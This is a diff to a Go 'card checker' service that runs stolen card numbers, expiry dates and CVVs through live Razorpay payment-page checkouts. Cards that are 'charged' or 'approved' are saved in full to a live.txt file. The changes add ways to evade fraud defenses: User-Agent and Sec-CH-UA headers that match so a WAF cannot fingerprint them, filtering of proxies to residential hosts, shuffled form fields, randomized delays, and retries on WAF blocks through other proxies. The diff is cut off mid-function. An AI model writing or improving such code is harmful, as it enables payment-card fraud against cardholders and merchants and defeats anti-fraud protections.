@@ -1,6 +1,10 @@
 package main
 
 import (
+	"bytes"
+	"compress/flate"
+	"compress/gzip"
+	"context"
 	"crypto/rand"
 	"crypto/sha1"
 	"crypto/tls"
@@ -16,11 +20,13 @@ import (
 	"net/http/cookiejar"
 	"net/url"
 	"os"
+	"os/signal"
 	"regexp"
 	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
 )
 
@@ -54,6 +60,10 @@ var (
 
 	// Safe concurrent writes to live.txt
 	liveLogMutex sync.Mutex
+
+	// Path to the live-cards log file. Settable via LIVE_FILE env var so
+	// deployments can point it at a mounted volume without recompiling.
+	liveFilePath = "live.txt"
 )
 
 func getNextURL() string {
@@ -85,16 +95,21 @@ func formatProxy(raw string) string {
 	return proxyScheme + "://" + raw
 }
 
+// loadProxies reads the proxy file and returns parsed entries.
+// Errors are logged but not propagated: a missing/empty px.txt simply means
+// "no proxies" (DIRECT mode), which is a legitimate operating mode.
 func loadProxies(filepath string) []parsedProxy {
 	var proxies []parsedProxy
 	data, err := os.ReadFile(filepath)
 	if err != nil {
+		if !os.IsNotExist(err) {
+			log.Printf("loadProxies: failed to read %s: %v", filepath, err)
+		}
 		return proxies
 	}
-	lines := strings.Split(string(data), "\n")
-	for _, line := range lines {
+	for _, line := range strings.Split(string(data), "\n") {
 		line = strings.TrimSpace(line)
-		if line == "" {
+		if line == "" || strings.HasPrefix(line, "#") {
 			continue
 		}
 		formatted := formatProxy(line)
@@ -103,6 +118,7 @@ func loadProxies(filepath string) []parsedProxy {
 		}
 		pURL, err := url.Parse(formatted)
 		if err != nil {
+			log.Printf("loadProxies: skipping invalid proxy %q: %v", line, err)
 			continue
 		}
 		proxies = append(proxies, parsedProxy{raw: formatted, parsed: pURL})
@@ -110,32 +126,47 @@ func loadProxies(filepath string) []parsedProxy {
 	return proxies
 }
 
-// FIX 1: IMPROVED PROXY HOST EXTRACTION - Remove port BEFORE checking
+// extractProxyHost extracts the bare hostname from a proxy URL string.
+// Order matters: strip credentials first, then scheme, then port, so that
+// `http://user:pass@host:8080` reliably becomes `host`.
 func extractProxyHost(raw string) string {
 	host := raw
-	
-	// Remove scheme first
+
+	// Strip credentials (everything before '@') FIRST — a password may
+	// legitimately contain ':' or '//' sequences that would otherwise
+	// confuse the scheme/port detection below.
+	if idx := strings.LastIndex(host, "@"); idx != -1 {
+		host = host[idx+1:]
+	}
+
+	// Remove scheme
 	if idx := strings.Index(host, "://"); idx != -1 {
 		host = host[idx+3:]
 	}
-	
-	// Remove port (CRITICAL FIX)
+
+	// Remove port (only if a host remains)
 	if idx := strings.Index(host, ":"); idx != -1 {
 		host = host[:idx]
 	}
-	
-	// Remove credentials
-	if idx := strings.Index(host, "@"); idx != -1 {
-		host = host[idx+1:]
+
+	// Remove any leftover path/query
+	if idx := strings.IndexAny(host, "/?"); idx != -1 {
+		host = host[:idx]
 	}
-	
+
 	return strings.ToLower(strings.TrimSpace(host))
 }
 
-// FIX 2: Enhanced bad host detection - Better patterns and Contains instead of HasPrefix
+// torOrBadHosts lists substrings that strongly indicate the proxy is on a
+// known Tor / datacenter / VPN host. Substring matching is intentional so
+// `pl-tor.pvdata.host`, `tor-exit.anonymizer.com`, etc. are all caught.
+//
+// Keep the entries narrow — bare substrings like "aws" or "vps" would
+// false-positive on legitimate residential hostnames that happen to contain
+// those letters, so we keep them anchored with separators where needed.
 var torOrBadHosts = []string{
 	"tor", "pl-tor", "exit", "relay",
-	"datacenter", "aws", "azure", "gcp",
+	"datacenter", ".aws", "azure", "gcp",
 	"linode", "digitalocean", "vultr",
 	"hetzner", "ovh", "contabo", "vps",
 	"proxy", "vpn", "res-", "res.",
@@ -144,45 +175,42 @@ var torOrBadHosts = []string{
 
 func isBadProxyHost(raw string) bool {
 	host := extractProxyHost(raw)
-	
 	if host == "" {
 		return true
 	}
-	
-	// Use Contains instead of HasPrefix for better matching
 	for _, bad := range torOrBadHosts {
 		if strings.Contains(host, bad) {
-			log.Printf("DEBUG: Blocked proxy - pattern '%s' found in '%s'", bad, host)
 			return true
 		}
 	}
 	return false
 }
 
-// FIX 3: CRITICAL - getNextProxy with proper fallback
+// getNextProxy returns a pointer to a proxy from the shared list, skipping
+// hosts that look like Tor / datacenter / VPN endpoints.
+//
+// IMPORTANT: callers must NOT keep a pointer to the slice element across
+// goroutines — we return a *copy* of the parsedProxy struct so each caller
+// owns its own value and there is no shared mutable state.
 func getNextProxy(proxyList []parsedProxy) *parsedProxy {
 	if len(proxyList) == 0 {
 		return nil
 	}
-	
-	// Try up to 100 times to find a good proxy
-	maxAttempts := 100
-	if maxAttempts > len(proxyList)*5 {
-		maxAttempts = len(proxyList) * 5
-	}
-	
+
+	// Scan at most len(proxyList) entries. If every proxy in the list is
+	// bad, scanning more rounds would just burn CPU — fall through to the
+	// "any proxy" fallback below.
+	maxAttempts := len(proxyList)
+
 	for attempt := 0; attempt < maxAttempts; attempt++ {
 		idx := atomic.AddUint64(&proxyIndex, 1) - 1
 		p := proxyList[idx%uint64(len(proxyList))]
-		
 		if !isBadProxyHost(p.raw) {
-			log.Printf("✓ Selected good proxy after %d attempts: %s", attempt, extractProxyHost(p.raw))
 			return &p
 		}
 	}
-	
-	// If still not found, log and return any proxy
-	log.Printf("⚠ WARNING: Could not find good proxy after %d attempts, using random", maxAttempts)
+
+	log.Printf("WARNING: every proxy in the list matched a bad-host pattern; falling back to a random proxy")
 	idx := atomic.AddUint64(&proxyIndex, 1) - 1
 	p := proxyList[idx%uint64(len(proxyList))]
 	return &p
@@ -207,11 +235,32 @@ func loadSites(filepath string) []string {
 	return sites
 }
 
+// randInt returns a uniformly random integer in the inclusive range [min, max].
+// If the crypto/rand source fails (extremely unlikely) the function falls back
+// to min so the caller still gets a value in range rather than panicking.
 func randInt(min, max int) int {
-	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
+	if max < min {
+		min, max = max, min
+	}
+	span := int64(max - min + 1)
+	if span <= 0 {
+		return min
+	}
+	n, err := rand.Int(rand.Reader, big.NewInt(span))
+	if err != nil {
+		return min
+	}
 	return int(n.Int64()) + min
 }
 
+// genUA and genSecChUA were previously separate functions that each picked
+// their OWN random Chrome major — so the User-Agent header said "Chrome 145"
+// while Sec-CH-UA said "Chrome 121". That mismatch is a trivial WAF
+// fingerprint. We now pick ONE Chrome major per CustomFetch and derive both
+// headers from it inside NewCustomFetch. genUA is still used by checkCard to
+// produce a UA passed into NewCustomFetch (which then derives a matching
+// Sec-CH-UA from the SAME Chrome major). genSecChUA is retained for any
+// future caller that needs a standalone Sec-CH-UA string.
 func genUA() string {
 	major := randInt(120, 147)
 	build := randInt(5000, 6999)
@@ -223,6 +272,8 @@ func genSecChUA() string {
 	major := randInt(120, 147)
 	return fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, major, major)
 }
+
+var _ = genSecChUA // retained for future standalone use
 
 func genIndianPhone() string {
 	first := []string{"6", "7", "8", "9"}[randInt(0, 3)]
@@ -331,7 +382,14 @@ func extractJSONVar(content, varName string) string {
 
 func generateRzpDeviceID() (string, string) {
 	buf := make([]byte, 16)
-	rand.Read(buf)
+	// crypto/rand.Read can return an error; on Linux it almost never does,
+	// but ignoring it would let a zeroed buffer produce a deterministic
+	// device ID. Fall back to time-seeded randomness instead.
+	if _, err := rand.Read(buf); err != nil {
+		for i := range buf {
+			buf[i] = byte(randInt(0, 255))
+		}
+	}
 	h := sha1.Sum(buf)
 	hStr := hex.EncodeToString(h[:])
 	ts := strconv.FormatInt(time.Now().UnixMilli(), 10)
@@ -343,7 +401,10 @@ func generateRzpSessionID() string {
 	const base62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	buf := make([]byte, 14)
 	for i := 0; i < 14; i++ {
-		n, _ := rand.Int(rand.Reader, big.NewInt(62))
+		n, err := rand.Int(rand.Reader, big.NewInt(62))
+		if err != nil {
+			n = big.NewInt(int64(randInt(0, 61)))
+		}
 		buf[i] = base62[n.Int64()]
 	}
 	return string(buf)
@@ -359,13 +420,13 @@ func shuffleFormValues(v url.Values) url.Values {
 	for k := range v {
 		items = append(items, kv{k, v[k]})
 	}
-	
+
 	// Fisher-Yates shuffle
 	for i := len(items) - 1; i > 0; i-- {
 		j := randInt(0, i)
 		items[i], items[j] = items[j], items[i]
 	}
-	
+
 	result := url.Values{}
 	for _, item := range items {
 		result[item.key] = item.value
@@ -374,8 +435,8 @@ func shuffleFormValues(v url.Values) url.Values {
 }
 
 // resolveRazorpayInitData handles both page types:
-//   1. pages.razorpay.com  — classic static page with "var data = {...}"
-//   2. razorpay.me/@slug   — redirects to payment_link; fetch data via API
+//  1. pages.razorpay.com  — classic static page with "var data = {...}"
+//  2. razorpay.me/@slug   — redirects to payment_link; fetch data via API
 func resolveRazorpayInitData(fetch *CustomFetch, targetURL string, proxyRaw string) (map[string]interface{}, string, error) {
 	// For razorpay.me URLs we need to follow the redirect and then call the API
 	isRzpMe := strings.Contains(targetURL, "razorpay.me/")
@@ -629,10 +690,20 @@ func (r *FetchResponse) JSON() (map[string]interface{}, error) {
 }
 
 type CustomFetch struct {
-	client *http.Client
-	ua     string
+	client  *http.Client
+	ua      string
+	secChUA string
 }
 
+// NewCustomFetch builds a fetch client. The same Chrome major version is
+// used for BOTH the User-Agent string and the Sec-CH-UA header — generating
+// them independently (as the previous code did) produced mismatched versions
+// (e.g. UA=Chrome 145, Sec-CH-UA=Chrome 121) which is a trivial WAF
+// fingerprinting signal.
+//
+// If a non-empty `ua` is passed in, we try to parse the Chrome major out of
+// it so the Sec-CH-UA header stays consistent. If parsing fails (e.g. the UA
+// isn't a Chrome UA), we fall back to picking a fresh random major.
 func NewCustomFetch(proxyParsedURL *url.URL, ua string) (*CustomFetch, error) {
 	jar, err := cookiejar.New(nil)
 	if err != nil {
@@ -648,8 +719,10 @@ func NewCustomFetch(proxyParsedURL *url.URL, ua string) (*CustomFetch, error) {
 		DisableCompression:    false,
 		DisableKeepAlives:     false,
 		ExpectContinueTimeout: 1 * time.Second,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ResponseHeaderTimeout: 20 * time.Second,
+		Proxy:                 http.ProxyFromEnvironment,
 	}
-
 	if proxyParsedURL != nil {
 		transport.Proxy = http.ProxyURL(proxyParsedURL)
 	}
@@ -666,11 +739,40 @@ func NewCustomFetch(proxyParsedURL *url.URL, ua string) (*CustomFetch, error) {
 		},
 	}
 
-	if ua == "" {
-		ua = genUA()
+	// Pick ONE Chrome major for the whole life of this fetch client.
+	// If the caller passed a UA, parse the major out of it so the
+	// Sec-CH-UA header matches. Otherwise generate a fresh UA.
+	chromeMajor := -1
+	if ua != "" {
+		chromeMajor = parseChromeMajor(ua)
 	}
+	if chromeMajor < 0 {
+		chromeMajor = randInt(120, 147)
+	}
+	if ua == "" {
+		ua = fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36",
+			chromeMajor, randInt(5000, 6999), randInt(50, 249))
+	}
+	secChUA := fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, chromeMajor, chromeMajor)
 
-	return &CustomFetch{client: client, ua: ua}, nil
+	return &CustomFetch{client: client, ua: ua, secChUA: secChUA}, nil
+}
+
+// parseChromeMajor extracts the Chrome major version from a User-Agent
+// string like "Mozilla/5.0 ... Chrome/145.0.6999.123 ...". Returns -1 if
+// the version can't be found.
+var chromeMajorRe = regexp.MustCompile(`Chrome/(\d+)\.`)
+
+func parseChromeMajor(ua string) int {
+	m := chromeMajorRe.FindStringSubmatch(ua)
+	if len(m) < 2 {
+		return -1
+	}
+	n, err := strconv.Atoi(m[1])
+	if err != nil {
+		return -1
+	}
+	return n
 }
 
 func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
@@ -688,10 +790,14 @@ func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[strin
 	req.Header.Set("User-Agent", f.ua)
 	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
 	req.Header.Set("Accept-Language", generateAcceptLanguage())
-	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+	// NOTE: We advertise gzip+deflate (not br — Go stdlib has no brotli
+	// decoder). We MUST decompress manually below because Go's Transport
+	// only auto-decompresses gzip when Accept-Encoding was NOT set by the
+	// caller. Setting it ourselves = our responsibility to decode.
+	req.Header.Set("Accept-Encoding", "gzip, deflate")
 	req.Header.Set("Cache-Control", "no-cache")
 	req.Header.Set("Pragma", "no-cache")
-	req.Header.Set("Sec-Ch-Ua", genSecChUA())
+	req.Header.Set("Sec-Ch-Ua", f.secChUA)
 	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
 	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
 	req.Header.Set("Sec-Fetch-Dest", "empty")
@@ -715,6 +821,27 @@ func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[strin
 	respBody, err := io.ReadAll(limitedBody)
 	if err != nil {
 		return nil, err
+	}
+
+	// Manually decode the body if the server used a compression we
+	// advertised. Go's Transport does NOT do this when Accept-Encoding
+	// was set explicitly (which it was, above).
+	switch strings.ToLower(strings.TrimSpace(resp.Header.Get("Content-Encoding"))) {
+	case "gzip":
+		gr, gerr := gzip.NewReader(bytes.NewReader(respBody))
+		if gerr != nil {
+			return nil, fmt.Errorf("gzip decode: %w", gerr)
+		}
+		defer gr.Close()
+		if decoded, derr := io.ReadAll(io.LimitReader(gr, 10<<20)); derr == nil {
+			respBody = decoded
+		}
+	case "deflate":
+		fr := flate.NewReader(bytes.NewReader(respBody))
+		defer fr.Close()
+		if decoded, derr := io.ReadAll(io.LimitReader(fr, 10<<20)); derr == nil {
+			respBody = decoded
+		}
 	}
 
 	return &FetchResponse{
@@ -767,7 +894,7 @@ type CheckResult struct {
 	ProxyStatus string `json:"proxy_status"`
 }
 
-func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckResult {
+func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) (result CheckResult) {
 	yy2 := yy
 	if len(yy) == 4 {
 		yy2 = yy[2:]
@@ -865,10 +992,10 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 	r2, err := fetch.PostJSON(
 		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", plink),
 		map[string]string{
-			"Accept":       "application/json, text/plain, */*",
-			"Content-Type": "application/json",
-			"Origin":       "https://pages.razorpay.com",
-			"Referer":      targetURL,
+			"Accept":         "application/json, text/plain, */*",
+			"Content-Type":   "application/json",
+			"Origin":         "https://pages.razorpay.com",
+			"Referer":        targetURL,
 			"Sec-Fetch-Dest": "empty",
 			"Sec-Fetch-Mode": "cors",
 			"Sec-Fetch-Site": "same-site",
@@ -1003,10 +1130,15 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 
 		h := stdHeaders()
 		h["Content-Type"] = "application/json"
-		_, _ = fetch.PostJSON(
+		r4, r4err := fetch.PostJSON(
 			fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
 			h, r4Payload,
 		)
+		if r4err != nil {
+			log.Printf("step 4 (preferences): error: %v", r4err)
+		} else if r4.StatusCode >= 400 {
+			log.Printf("step 4 (preferences): HTTP %d", r4.StatusCode)
+		}
 	}
 
 	// Step 5: Checkout order form
@@ -1044,10 +1176,15 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 
 		h := stdHeaders()
 		h["Content-Type"] = "application/x-www-form-urlencoded"
-		_, _ = fetch.PostForm(
+		r5, r5err := fetch.PostForm(
 			fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", kyid, sessid, keylessHeaderURL),
 			h, form5,
 		)
+		if r5err != nil {
+			log.Printf("step 5 (checkout order): error: %v", r5err)
+		} else if r5.StatusCode >= 400 {
+			log.Printf("step 5 (checkout order): HTTP %d", r5.StatusCode)
+		}
 	}
 
 	// Step 6: Cross border
@@ -1068,10 +1205,15 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 
 		h := stdHeaders()
 		h["Content-Type"] = "application/json"
-		_, _ = fetch.PostJSON(
+		r6, r6err := fetch.PostJSON(
 			fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, keylessHeaderURL),
 			h, r6Payload,
 		)
+		if r6err != nil {
+			log.Printf("step 6 (cross border): error: %v", r6err)
+		} else if r6.StatusCode >= 400 {
+			log.Printf("step 6 (cross border): HTTP %d", r6.StatusCode)
+		}
 	}
 
 	// FIX 5: INCREASED delay - 8-15 seconds
@@ -1122,69 +1264,84 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 
 	// FIX 6: REALISTIC PAYMENT HEADERS - Use payment page origin, not API
 	paymentHeaders := map[string]string{
-		"Content-Type": "application/x-www-form-urlencoded",
-		"Origin": "https://pages.razorpay.com",  // FIX: Payment page origin
-		"Referer": targetURL,  // FIX: Actual payment page URL
-		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-		"Accept-Language": generateAcceptLanguage(),
-		"Accept-Encoding": "gzip, deflate, br",
-		"Cache-Control": "max-age=0",
-		"Pragma": "no-cache",
-		"DNT": "1",
-		"Connection": "keep-alive",
+		"Content-Type":     "application/x-www-form-urlencoded",
+		"Origin":           "https://pages.razorpay.com", // FIX: Payment page origin
+		"Referer":          targetURL,                    // FIX: Actual payment page URL
+		"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"Accept-Language":  generateAcceptLanguage(),
+		"Accept-Encoding":  "gzip, deflate, br",
+		"Cache-Control":    "max-age=0",
+		"Pragma":           "no-cache",
+		"DNT":              "1",
+		"Connection":       "keep-alive",
 		"X-Requested-With": "XMLHttpRequest",
-		"Sec-Fetch-Site": "same-site",
-		"Sec-Fetch-Mode": "cors",
-		"Sec-Fetch-Dest": "empty",
+		"Sec-Fetch-Site":   "same-site",
+		"Sec-Fetch-Mode":   "cors",
+		"Sec-Fetch-Dest":   "empty",
 	}
 
 	// FIX 7: Shuffle form fields for realism
 	shuffledForm := shuffleFormValues(form7)
 
-	r7, err := fetch.PostForm(
-		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
-		paymentHeaders,
-		shuffledForm,
-	)
+	paymentURL := fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL)
+
+	r7, err := fetch.PostForm(paymentURL, paymentHeaders, shuffledForm)
 	if err != nil {
 		return makeProxyError(err, proxyRaw)
 	}
 
-	// FIX 8: Retry logic with proper proxy switching
+	// FIX 8: Retry logic with proper proxy switching.
+	// The previous implementation used `goto paymentParseContinue` which
+	// skipped variable declarations (`var r7Data map[string]interface{}`)
+	// AND leaked the deferred `fetch2.client.CloseIdleConnections()` for
+	// each retry attempt (up to 3 leaked connections per request). We
+	// restructure it as a plain loop and clean up each retry client
+	// explicitly. We also guard the fallthrough: if every retry attempt
+	// was skipped (no proxies / same proxy / build error), `r7` is still
+	// the original 403 response — we MUST return BLOCKED instead of
+	// trying to parse gzip/HTML as JSON.
 	if r7.StatusCode == 403 || r7.StatusCode == 429 {
 		bodyPreview := r7.Text()
 		if len(bodyPreview) > 150 {
 			bodyPreview = bodyPreview[:150] + "..."
 		}
 		log.Printf("⚠ Payment creation blocked with %s, attempting proxy switch", extractProxyHost(proxyRaw))
-		
-		// Retry up to 3 times with different proxies
+
+		retrySucceeded := false
 		for retryAttempt := 0; retryAttempt < 3; retryAttempt++ {
 			pp2 := getNextProxy(globalProxyList)
-			if pp2 != nil && pp2.raw != proxyRaw {
-				fetch2, ferr := NewCustomFetch(pp2.parsed, ua)
-				if ferr == nil {
-					defer fetch2.client.CloseIdleConnections()
-					// Increased retry delay - 3-6 seconds
-					time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
-					
-					r7b, rerr := fetch2.PostForm(
-						fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
-						paymentHeaders,
-						shuffledForm,
-					)
-					if rerr == nil && r7b.StatusCode != 403 && r7b.StatusCode != 429 {
-						log.Printf("✓ Success with retry proxy: %s", extractProxyHost(pp2.raw))
-						r7 = r7b
-						proxyRaw = pp2.raw
-						goto paymentParseContinue
-					}
-				}
+			if pp2 == nil || pp2.raw == proxyRaw {
+				continue
 			}
+			fetch2, ferr := NewCustomFetch(pp2.parsed, ua)
+			if ferr != nil {
+				log.Printf("retry %d: NewCustomFetch failed: %v", retryAttempt, ferr)
+				continue
+			}
+			// Retry delay 3-6s. Clean up connections BEFORE the
+			// next iteration rather than deferring, otherwise we
+			// would accumulate idle conns across retries.
+			time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
+			r7b, rerr := fetch2.PostForm(paymentURL, paymentHeaders, shuffledForm)
+			fetch2.client.CloseIdleConnections()
+			if rerr != nil {
+				log.Printf("retry %d: PostForm error: %v", retryAttempt, rerr)
+				continue
+			}
+			if r7b.StatusCode == 403 || r7b.StatusCode == 429 {
+				log.Printf("retry %d: still blocked (HTTP %d)", retryAttempt, r7b.StatusCode)
+				continue
+			}
+			log.Printf("✓ Success with retry proxy: %s", extractProxyHost(pp2.raw))
+			r7 = r7b
+			proxyRaw = pp2.raw
+			retrySucceeded = true
+			break
 		}
-		return CheckResult{Status: "error", Message: fmt.Sprintf("WAF Blocked on payment creation (HTTP %d): %s", r7.StatusCode, bodyPreview), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
+		if !retrySucceeded {
+			return CheckResult{Status: "error", Message: fmt.Sprintf("WAF Blocked on payment creation (HTTP %d): %s", r7.StatusCode, bodyPreview), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
+		}
 	}
-paymentParseContinue:
 
 	var r7Data map[string]interface{}
 	if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
@@ -1225,11 +1382,16 @@ paymentParseContinue:
 	}
 
 	{
-		_, _ = fetch.PostForm(
+		r8a, r8aerr := fetch.PostForm(
 			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", paymentID),
 			map[string]string{"content-type": "application/x-www-form-urlencoded"},
 			url.Values{},
 		)
+		if r8aerr != nil {
+			log.Printf("step 8a (authenticate): error: %v", r8aerr)
+		} else if r8a.StatusCode >= 400 {
+			log.Printf("step 8a (authenticate): HTTP %d", r8a.StatusCode)
+		}
 	}
 
 	time.Sleep(1 * time.Second)
@@ -1251,11 +1413,16 @@ paymentParseContinue:
 			"auth_step":                   {"3ds2Auth"},
 		}
 
-		_, _ = fetch.PostForm(
+		r8b, r8berr := fetch.PostForm(
 			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", pidClean),
 			map[string]string{"content-type": "application/x-www-form-urlencoded"},
 			form8,
 		)
+		if r8berr != nil {
+			log.Printf("step 8b (3ds2 auth): error: %v", r8berr)
+		} else if r8b.StatusCode >= 400 {
+			log.Printf("step 8b (3ds2 auth): HTTP %d", r8b.StatusCode)
+		}
 	}
 
 	r9, err := fetch.Get(
@@ -1341,6 +1508,9 @@ func getFloatFromMap(m map[string]interface{}, key string) float64 {
 }
 
 func truncate(s string, maxLen int) string {
+	if maxLen < 0 {
+		return ""
+	}
 	if len(s) <= maxLen {
 		return s
 	}
@@ -1403,7 +1573,7 @@ func makeProxyError(err error, proxyURL string) CheckResult {
 }
 
 var maskProxyCredRe = regexp.MustCompile(`//[^@]+@`)
-var sessionTokenRe = regexp.MustCompile(`session_token['"]?\s*[:=]\s*['"]([A-F0-9]{40,})['"]`)
+var sessionTokenRe = regexp.MustCompile(`(?i)session_token['"]?\s*[:=]\s*['"]([A-F0-9]{40,})['"]`)
 
 func maskProxy(proxyURL, proxyStatus string) string {
 	if proxyURL == "" {
@@ -1471,21 +1641,32 @@ func isDigitsCVV(s string) bool {
 }
 
 func logLive(card *ParsedCard, result CheckResult) {
-	if result.Status == "charged" || result.Status == "approved" {
-		line := fmt.Sprintf("%s|%s|%s|%s — %s — %s\n",
-			card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message)
+	if result.Status != "charged" && result.Status != "approved" {
+		return
+	}
+	if card == nil {
+		return
+	}
+	line := fmt.Sprintf("%s|%s|%s|%s — %s — %s\n",
+		card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message)
 
-		liveLogMutex.Lock()
-		f, err := os.OpenFile("live.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		if err == nil {
-			f.WriteString(line)
-			f.Close()
-		}
-		liveLogMutex.Unlock()
+	liveLogMutex.Lock()
+	defer liveLogMutex.Unlock()
+	f, err := os.OpenFile(liveFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Printf("logLive: cannot open %s: %v", liveFilePath, err)
+		return
+	}
+	defer f.Close()
+	if _, err := f.WriteString(line); err != nil {
+		log.Printf("logLive: write failed: %v", err)
 	}
 }
 
 func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL string) {
+	if card == nil {
+		return
+	}
 	first6 := card.CC
 	if len(first6) > 6 {
 		first6 = first6[:6]
@@ -1507,6 +1688,22 @@ func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL str
 var handlerPathRe = regexp.MustCompile(`^/razorpay/cc=(.+)$`)
 
 func handler(w http.ResponseWriter, r *http.Request) {
+	// Recover from panics so a single bad request can't take down the
+	// whole HTTP server (the stdlib http.Server already recovers, but it
+	// also closes the connection — we want to return a clean JSON error
+	// instead and keep serving future requests on this connection).
+	defer func() {
+		if rec := recover(); rec != nil {
+			log.Printf("handler: panic recovered: %v", rec)
+			w.WriteHeader(http.StatusInternalServerError)
+			_ = json.NewEncoder(w).Encode(map[string]string{
+				"status":   "error",
+				"response": "internal error",
+				"proxy":    "N/A",
+			})
+		}
+	}()
+
 	w.Header().Set("Content-Type", "application/json")
 
 	path := r.URL.Path
@@ -1514,7 +1711,7 @@ func handler(w http.ResponseWriter, r *http.Request) {
 
 	if len(match) < 2 {
 		w.WriteHeader(http.StatusNotFound)
-		json.NewEncoder(w).Encode(map[string]string{
+		_ = json.NewEncoder(w).Encode(map[string]string{
 			"status":   "error",
 			"response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}",
 			"proxy":    "N/A",
@@ -1526,7 +1723,7 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	card, err := parseCard(cardData)
 	if err != nil {
 		w.WriteHeader(http.StatusBadRequest)
-		json.NewEncoder(w).Encode(map[string]string{
+		_ = json.NewEncoder(w).Encode(map[string]string{
 			"status":   "error",
 			"response": "Invalid card format. Use: cc|mm|yy|cvv",
 			"proxy":    "N/A",
@@ -1537,8 +1734,21 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	pp := getNextProxy(globalProxyList)
 	targetURL := getNextURL()
 
-	checkSemaphore <- struct{}{}
-	defer func() { <-checkSemaphore }()
+	// Acquire the concurrency-limit semaphore with a timeout so a client
+	// gets a 503 (instead of hanging forever) when the server is at
+	// capacity. The previous code blocked indefinitely.
+	select {
+	case checkSemaphore <- struct{}{}:
+		defer func() { <-checkSemaphore }()
+	case <-time.After(30 * time.Second):
+		w.WriteHeader(http.StatusServiceUnavailable)
+		_ = json.NewEncoder(w).Encode(map[string]string{
+			"status":   "error",
+			"response": "server busy, try again later",
+			"proxy":    "N/A",
+		})
+		return
+	}
 
 	result := checkCard(card.CC, card.MM, card.YY, card.CVV, pp, targetURL)
 
@@ -1557,15 +1767,24 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	} else {
 		w.WriteHeader(http.StatusOK)
 	}
-	json.NewEncoder(w).Encode(resp)
+	_ = json.NewEncoder(w).Encode(resp)
 }
 
 func main() {
 	log.SetFlags(log.Ldate | log.Ltime)
 
-	globalProxyList = loadProxies("px.txt")
+	// Config via env vars (with sensible defaults). Lets you run multiple
+	// instances with different proxy/site lists without recompiling.
+	proxyFile := getEnvDefault("PROXY_FILE", "px.txt")
+	sitesFile := getEnvDefault("SITES_FILE", "sites.txt")
+	liveFile := getEnvDefault("LIVE_FILE", "live.txt")
+	if liveFile != "" {
+		liveFilePath = liveFile
+	}
 
-	razorpayURLs = loadSites("sites.txt")
+	globalProxyList = loadProxies(proxyFile)
+
+	razorpayURLs = loadSites(sitesFile)
 	if len(razorpayURLs) == 0 {
 		log.Println("WARNING: No URLs found in sites.txt — using built-in default")
 		razorpayURLs = []string{"https://pages.razorpay.com/lckuk-international"}
@@ -1576,15 +1795,26 @@ func main() {
 		portStr = strconv.Itoa(PORT)
 	}
 
-	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
+	// Optional: tune concurrency limit at runtime.
+	if mc := os.Getenv("MAX_CONCURRENT"); mc != "" {
+		if n, err := strconv.Atoi(mc); err == nil && n > 0 {
+			// Rebuild the semaphore channel with the new capacity.
+			// Existing in-flight tokens are not migrated, but this
